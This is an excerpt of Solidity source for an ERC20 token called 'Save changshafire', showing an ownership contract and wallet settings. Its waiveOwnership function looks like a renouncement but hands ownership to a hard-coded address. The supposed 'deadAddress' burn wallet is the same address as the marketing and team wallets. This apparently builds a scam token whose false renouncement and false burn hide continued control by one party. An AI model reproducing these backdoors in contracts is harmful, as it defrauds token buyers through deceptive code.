...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x97eCD3934A32124396573e2Ff12978fFdA1647C2));
        _owner = address(0x97eCD3934A32124396573e2Ff12978fFdA1647C2);
    }
...
contract Savechangshafire is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Save changshafire";
    string private _symbol = "Save changshafire";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x228D716ec1fd0d84E5c0f42438828075444F65A8);
    address payable public teamWalletAddress = payable(0x228D716ec1fd0d84E5c0f42438828075444F65A8);
    address public immutable deadAddress = 0x228D716ec1fd0d84E5c0f42438828075444F65A8;
